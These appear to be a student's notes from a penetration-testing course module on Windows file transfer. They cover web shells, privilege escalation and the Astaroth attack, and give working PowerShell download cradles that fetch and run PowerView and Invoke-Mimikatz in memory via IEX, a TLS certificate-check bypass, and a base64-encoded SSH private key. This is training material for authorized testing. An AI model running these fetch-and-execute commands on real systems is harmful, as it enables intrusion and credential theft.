During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the [Application Control Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control). We perform our local enumeration manually and find that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege). We need to transfer a binary to our target machine to escalate privileges using the [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) tool. We then try to use [Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the [Impacket smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.

# Windows File Transfer Methods
Let's use the [Microsoft Astaroth Attack](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) blog post as an example of an advanced persistent threat (APT).

The blog post starts out talking about [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.

The `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process. Below is a graphical depiction of the attack.

This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.

This section will discuss using some native Windows tools for download and upload operations. Later in the module, we'll discuss `Living Off The Land` binaries on Windows & Linux and how to use them to perform file transfer operations.

# Download Operations

We have access to the machine `MS02`, and we need to download a file from our `Pwnbox` machine. Let's see how we can accomplish this using multiple File Download methods.

![Network diagram showing a Windows PC, Layer 2 switch, firewall, cloud, and Linux PC.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/WIN-download-PwnBox.png)
## PowerShell Base64 Encode & Decode
Imp:: here we are converting file we wanna transfer to base64 encoding and then decode in windows machine and get original file.

Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.

An essential step in using this method is to ensure the file you encode and decode is correct. We can use [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.

First check MD5 Hash of a file we wanna send then after getting the file in target machine always check it with original pownbox hash. Thus we will know it has not been tempered.

```shell
md5sum id_rsa
```
![](../../Attachements/Pasted%20image%2020260726121819.png)

Now lets encode the id_rsa file content to base64 and then transfer.
```shell
cat id_rsa |base64 -w 0;echo
```
We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
```PowerShell-session
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
Finally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.

```Powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
![](../../Attachements/Pasted%20image%2020260726122216.png)
**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

## PowerShell Web Downloads
Most companies allow `HTTP` and `HTTPS` outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

Let's explore some examples of those methods for downloading files using PowerShell.
#### PowerShell DownloadFile Method

We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.

#### File Download
```Powershell
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') 
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1') 
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') 
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```


 #### Which is used in penetration testing?
- **`DownloadFile()`**
    - Simpler.
    - Most common in HTB labs and CTFs.
    - Good when you need the file before continuing.
- **`DownloadFileAsync()`**
    - Useful if the download is large or slow.
    - Lets you continue executing other commands while the file downloads.
    - Can make long-running downloads less disruptive.

#### PowerShell DownloadString - Fileless Method
As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
`IEX` also accepts pipeline input.
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### PowerShell Invoke-WebRequest
From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

#### Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
![](../../Attachements/Pasted%20image%2020260726124016.png)
This can be bypassed using the parameter `-UseBasicParsing`.
![](../../Attachements/Pasted%20image%2020260726124110.png)
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

![](../../Attachements/Pasted%20image%2020260726124226.png)
```powershell
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
